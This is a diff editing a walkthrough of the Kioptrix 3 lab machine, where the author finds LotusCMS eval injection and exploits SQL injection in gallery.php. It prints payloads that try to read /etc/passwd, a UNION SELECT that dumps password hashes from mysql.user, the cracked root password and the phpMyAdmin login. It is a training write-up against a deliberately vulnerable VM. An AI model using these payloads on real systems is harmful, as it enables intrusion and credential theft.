@@ -351,29 +351,30 @@ OS details: Linux 2.6.9 - 2.6.33*
 
     *Parse error: syntax error, unexpected '.', expecting T_STRING or T_VARIABLE or '$' in /home/www/kioptrix3.com/core/lib/router.php(26) : eval()'d code on line 1*
 
-    Wow looks like the input hits the PHP function eval. I try multiple inputs such as:
+    Wow, looks like the input hits the PHP function eval. I try multiple inputs such as:
 
     *http://192.168.0.9/index.php?system=system("cat /etc/passwd");*
 
-    I go to the main vendor site http://www.lotuscms.org/ and find that their site has the same issue, which means it is probably not the solution to the challenge. There is a remote code execution exploit available at:
+    But I don't manage to get anything useful through. I go to the main vendor site http://www.lotuscms.org/ and find that their site has the same issue, which means it is probably not the solution to the challenge. There is a remote code execution exploit available at:
     *https://packetstormsecurity.com/files/122161/LotusCMS-3.0-PHP-Code-Execution.html*
 
-    But it does not work. I start testing all the parameter of the app against input validation issues and find the following:
+    But it does not work. I start testing all the parameter of the app against input validation issues until I find the following:
     *GET /gallery/gallery.php?id=1' HTTP/1.1
 
 HTTP/1.1 200 OK
 ....
     You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' order by parentid,sort,name' at line 1Could not select category*
 
-    Looks like we found SQL injection, to confirm it is a numeric context within the where clause we can send:
-    *?id=1+or+1=1 and ?id=1+or+1=2*
-    Wee see we get difference responses. To exploit this, we want to use the union operator to make a subquery and leak sensitive data. First, we find the number of columns by sending the following payloads:
+    Looks like we found SQL injection, to confirm it is a errror based in numeric context within the where clause we can send:
+    *?id=1+or+1=1
+ ?id=1+or+1=2*
+    We see we get difference responses caused by a True vs False where clause. To exploit this, we want to use the union operator to make a subquery and leak sensitive data. First, we find the number of columns by sending the following payloads:
     *?id=1+union+select+1
-    ?id=1+union+select+1,1
-    ?id=1+union+select+1,1,1
-    ...*
+?id=1+union+select+1,1
+?id=1+union+select+1,1,1
+...*
 
-    We send the previous payload until the error message vanishes. The first error told us the backend runs MySql, we can find the hashes of the users' passwords in the table mysql.user, and use the following payload to leak it:
+    We send the previous payload until the error message vanishes. The first error told us the backend runs MySql, I check my cheat sheet of SQL injection at http://guif.re/sqli and try to leak the hashes of the users' passwords in the table mysql.user. The payload looks like:
 
 *GET /gallery/gallery.php?id=1+UNION+SELECT+host,+user,+password,+1,+1,+1+FROM+mysql.user%23 HTTP/1.1
 
@@ -381,4 +382,4 @@ HTTP/1.1 200 OK
 ...
 <a href="g.php/0" class="gallery">root</a><div class="desc">*47FB3B1E573D80F44CD198DC65DE7764795F948E</div><strong>Sub Galleries:</strong><table width="100%" cellspacing="0" cellpadding="0"> <tr>  <td class="subs">*
 
-    So we found the hash *47FB3B1E573D80F44CD198DC65DE7764795F948E*. We can use an online rainbow table mapper to find the plaintext, which is *fuckeyou*.
+    So we found the hash *47FB3B1E573D80F44CD198DC65DE7764795F948E*. We can use an online rainbow table web site to find the plaintext, which is *fuckeyou*. With the password we can log in at the PhpMyAdmin client locate at http://192.168.0.9/phpmyadmin
